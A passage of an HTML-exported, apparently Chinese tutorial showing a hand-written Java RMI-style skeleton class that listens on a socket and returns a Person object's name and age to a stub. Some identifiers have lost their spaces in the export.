class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">ObjectOutputStream</span>(<span class="cm-variable">socket</span>.<span class="cm-variable">getOutputStream</span>());</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">20</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">outStream</span>.<span class="cm-variable">writeObject</span>(<span class="cm-string">"name"</span>); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">21</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">outStream</span>.<span class="cm-variable">flush</span>(); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">22</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">ObjectInputStream</span> <span class="cm-variable">inStream</span><span class="cm-operator">=</span><span class="cm-keyword">new</span> <span class="cm-tab" role="presentation" cm-text="	"> </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">ObjectInputStream</span>(<span class="cm-variable">socket</span>.<span class="cm-variable">getInputStream</span>()); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">23</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> (<span class="cm-variable-3">String</span>)<span class="cm-variable">inStream</span>.<span class="cm-variable">readObject</span>();</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">24</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">25</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 657px;"></div><div class="CodeMirror-gutters" style="height: 657px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre><h4 id='skeleton-的实现'><span>Skeleton 的实现</span></h4><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="java" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="java"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>52</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -36px; width: 36px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">import</span> <span class="cm-variable">java</span>.<span class="cm-variable">io</span>.<span class="cm-variable">ObjectOutputStream</span>; </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">import</span> <span class="cm-variable">java</span>.<span class="cm-variable">io</span>.<span class="cm-variable">ObjectInputStream</span>; </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">import</span> <span class="cm-variable">java</span>.<span class="cm-variable">net</span>.<span class="cm-variable">Socket</span>; </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">import</span> <span class="cm-variable">java</span>.<span class="cm-variable">net</span>.<span class="cm-variable">ServerSocket</span>; </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">public</span> <span class="cm-keyword">class</span> <span class="cm-def">Person_Skeleton</span> <span class="cm-keyword">extends</span> <span class="cm-variable">Thread</span>{ </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">private</span> <span class="cm-variable">PersonServer</span> <span class="cm-variable">myServer</span>; </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">public</span> <span class="cm-variable">Person_Skeleton</span>(<span class="cm-variable">PersonServerserver</span>){ </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">//get reference of object server </span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">this</span>.<span class="cm-variable">myServer</span><span class="cm-operator">=</span><span class="cm-variable">server</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-variable">publicvoidrun</span>(){ </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">try</span>{ </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">//new socket at port 9000 </span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">ServerSocket</span> <span class="cm-variable">serverSocket</span><span class="cm-operator">=</span><span class="cm-variable">newServerSocket</span>(<span class="cm-number">9000</span>); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">//accept stub's request </span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">16</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">Socketsocket</span><span class="cm-operator">=</span><span class="cm-variable">serverSocket</span>.<span class="cm-variable">accept</span>(); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">17</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">while</span>(<span class="cm-variable">socket</span><span class="cm-operator">!=</span><span class="cm-atom">null</span>){ </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">18</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">//get stub's request </span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">19</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">ObjectInputStream</span> <span class="cm-variable">inStream</span><span class="cm-operator">=</span> <span class="cm-keyword">new</span> </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">20</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">ObjectInputStream</span>(<span class="cm-variable">socket</span>.<span class="cm-variable">getInputStream</span>()); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">21</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-3">String</span> <span class="cm-variable">method</span><span class="cm-operator">=</span> (<span class="cm-variable-3">String</span>)<span class="cm-variable">inStream</span>.<span class="cm-variable">readObject</span>(); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">22</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">//check method name</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">23</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span>(<span class="cm-variable">method</span>.<span class="cm-variable">equals</span>(<span class="cm-string">"age"</span>)){ </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">24</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">//execute object server's business method </span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">25</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-3">int</span> <span class="cm-variable">age</span><span class="cm-operator">=</span><span class="cm-variable">myServer</span>.<span class="cm-variable">getAge</span>(); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">26</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">ObjectOutputStream</span> <span class="cm-variable">outStream</span><span class="cm-operator">=</span><span class="cm-keyword">new</span> <span class="cm-tab" role="presentation" cm-text="	">   </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">ObjectOutputStream</span>(<span class="cm-variable">socket</span>.<span class="cm-variable">getOutputStream</span>()); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">27</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">//return result to stub </span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">28</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">outStream</span>.<span class="cm-variable">writeInt</span>(<span class="cm-variable">age</span>); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">29</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">outStream</span>.<span class="cm-variable">flush</span>();</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">30</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">31</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span>(<span class="cm-variable">method</span>.<span class="cm-variable">equals</span>(<span class="cm-string">"name"</span>)){ </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">32</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">//execute object server's business method </span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">33</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-3">String</span> <span class="cm-variable">name</span><span class="cm-operator">=</span><span class="cm-variable">myServer</span>.<span class="cm-variable">getName</span>(); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">34</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">ObjectOutputStream</span> <span class="cm-variable">outStream</span><span class="cm-operator">=</span><span class="cm-keyword">new</span> <span class="cm-tab" role="presentation" cm-text="	">   </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-tab" role="presentation" cm-text="	">    </span><span class="cm-variable">ObjectOutputStream</span>(<span class="cm-variable">socket</span>.<span class="cm-variable">getOutputStream</span>());</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">35</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">//return result to stub </span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">36</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">outStream</span>.<span class="cm-variable">writeObject</span>(<span class="cm-variable">name</span>); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">37</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">outStream</span>.<span class="cm-variable">flush</span>();</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">38</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">39</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">40</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">41</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">catch</span>(<span class="cm-variable">Throwablet</span>){ </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">42</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">t</span>.<span class="cm-variable">printStackTrace</span>(); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">43</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">System</span>.<span class="cm-variable">exit</span>(<span class="cm-number">0</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">44</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">45</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">46</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;<span class="cm-keyword">public</span> <span class="cm-keyword">static</span> <span class="cm-variable-3">void</span> <span class="cm-variable">main</span>(<span class="cm-variable-3">String</span> <span class="cm-variable">args</span>[]){ </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">47</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">//new object server </span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">48</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">PersonServer</span> <span class="cm-variable">person</span><span class="cm-operator">=</span><span class="cm-keyword">new</span> <span class="cm-variable">PersonServer</span>(<span class="cm-string">"Richard"</span>,<span class="cm-number">34</span>); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">49</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">Person_Skeleton</span> <span class="cm-variable">skel</span><span class="cm-operator">=</span><span class="cm-keyword">new</span> <span class="cm-variable">Person_Skeleton</span>(<span class="cm-variable">person</span>); </span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">50</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">skel</span>.<span class="cm-variable">start</span>();</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">51</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">52</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">}</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 1224px;"></div><div class="CodeMirror-gutters" style="height: 1224px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre><h4 id='client-实现'><span>Client 实现</span></h4><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="java"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="java"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 44px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div 